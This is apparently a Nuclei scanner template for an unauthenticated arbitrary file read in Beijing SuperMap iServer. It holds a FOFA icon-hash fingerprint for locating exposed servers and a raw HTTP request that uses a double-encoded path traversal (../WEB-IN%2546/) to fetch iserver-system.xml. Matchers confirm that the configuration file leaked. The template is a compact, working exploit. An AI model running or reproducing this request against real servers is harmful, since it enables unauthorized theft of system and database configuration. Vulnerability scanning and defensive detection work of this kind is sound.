http:
    - matchers:
        - condition: and
          part: body
          type: word
          words:
            - <?xml version=
            - <properties>
            - <management>
        - status:
            - 200
          type: status
      matchers-condition: and
      raw:
        - |
          GET /iserver/output/../WEB-IN%2546/iserver-system.xml HTTP/1.1
          Host: {{Hostname}}
          User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36
id: beijingchaotu-iserver-File-reading
info:
    author: Superhero
    description: |-
        fofa: icon_hash="-1656662001"
        北京超图软件 iserver 接口存在任意文件读取漏洞，未经身份验证攻击者可通过该漏洞读取系统重要文件（如数据库配置文件、系统配置文件）、数据库配置文件等等，导致网站处于极度不安全状态。
    name: 北京超图软件 iserver 任意文件读取漏洞
    reference:
        - https://mp.weixin.qq.com/s/nF9hkKtNuu4LyRX4vwQLcQ
    severity: high
    tags:
        - File reading
